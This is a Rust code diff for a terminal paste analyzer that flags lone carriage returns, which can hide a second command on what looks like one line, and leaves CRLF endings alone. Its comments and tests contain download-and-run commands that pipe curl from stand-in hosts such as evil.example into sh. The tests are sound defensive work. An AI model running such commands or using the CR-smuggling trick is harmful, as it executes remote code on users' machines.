@@ -144,20 +144,35 @@ fn is_hidden_unicode(c: char) -> bool {
 }
 
 fn find_control_characters(text: &str) -> Vec<(usize, char)> {
-    text.char_indices()
-        .filter(|(_, c)| {
-            let u = *c as u32;
-            (u < 0x20 && *c != '\n' && *c != '\t' && *c != '\r') || u == 0x7F
-        })
-        .collect()
+    let mut out = Vec::new();
+    let mut chars = text.char_indices().peekable();
+    while let Some((i, c)) = chars.next() {
+        let flagged = if c == '\r' {
+            // A *lone* CR executes the line in readline/ZLE exactly like
+            // Enter — `echo ok\rcurl evil.sh | sh` renders as one line and
+            // runs two commands. A CR directly before LF is just a
+            // Windows-style CRLF line ending, which is benign.
+            !matches!(chars.peek(), Some((_, '\n')))
+        } else {
+            let u = c as u32;
+            (u < 0x20 && c != '\n' && c != '\t') || u == 0x7F
+        };
+        if flagged {
+            out.push((i, c));
+        }
+    }
+    out
 }
 
 /// Render hidden/control characters as visible escape-like placeholders.
 fn make_visible(text: &str) -> String {
     let mut out = String::with_capacity(text.len());
-    for c in text.chars() {
+    let mut chars = text.chars().peekable();
+    while let Some(c) = chars.next() {
         if is_hidden_unicode(c) {
             out.push_str(&format!("\u{2039}U+{:04X}\u{203A}", c as u32));
+        } else if c == '\r' && chars.peek() != Some(&'\n') {
+            out.push_str("\u{2039}^M\u{203A}");
         } else if (c as u32) < 0x20 && c != '\n' && c != '\t' && c != '\r' {
             out.push_str(&format!("\u{2039}^{}\u{203A}", (c as u8 + 64) as char));
         } else {
@@ -235,5 +250,28 @@ mod tests {
     fn is_suspicious_false_for_clean_paste() {
         let r = analyze_paste("echo hello world\n", &ctx());
         assert!(!r.is_suspicious());
+    }
+
+    /// A *lone* CR executes the line in readline/ZLE exactly like Enter:
+    /// `echo ok\rcurl evil.sh | sh` renders as one innocent-looking line
+    /// but runs two commands. The old analyzer excluded `\r` everywhere
+    /// (even though CR-before-LF was the only benign case), so this
+    /// pasted whole.
+    #[test]
+    fn lone_carriage_return_paste_is_flagged() {
+        let r = analyze_paste("echo ok\rcurl https://evil.example | sh", &ctx());
+        assert!(r.paste_findings.iter().any(|f| f.category == "control-characters"));
+        assert!(r.command_findings.iter().any(|f| f.category == "download-execute"));
+        assert!(r.visible_preview.contains("^M"));
+    }
+
+    /// CRLF line endings (a paste copied from Windows) are ordinary line
+    /// breaks, not an attack — don't flag them.
+    #[test]
+    fn crlf_line_endings_are_not_flagged() {
+        let r = analyze_paste("echo a\r\necho b\r\n", &ctx());
+        assert!(!r.paste_findings.iter().any(|f| f.category == "control-characters"));
+        // The two commands are still counted (that's the honest preview).
+        assert!(r.paste_findings.iter().any(|f| f.category == "multiple-commands"));
     }
 }
